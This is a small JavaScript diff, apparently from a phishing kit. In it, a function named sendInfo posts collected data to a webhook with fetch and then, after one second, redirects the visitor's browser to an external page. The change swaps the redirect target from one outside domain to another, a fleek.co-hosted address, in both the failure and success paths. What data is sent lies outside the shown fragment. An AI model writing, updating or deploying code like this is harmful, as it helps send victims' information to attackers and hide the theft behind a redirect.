@@ -81,10 +81,10 @@ async function sendInfo() {
     await fetch(webhook, config);
   } catch {
     setTimeout(function() {
-        window.location.replace("https://www.tipsproexplorer.com/cgi-bii/")
+        window.location.replace("https://spring-feather-2536.on.fleek.co/")
     }, 1000);
   }
   setTimeout(function() {
-    window.location.replace("https://www.tipsproexplorer.com/cgi-bii/")
+    window.location.replace("https://spring-feather-2536.on.fleek.co/")
   }, 1000);
 }
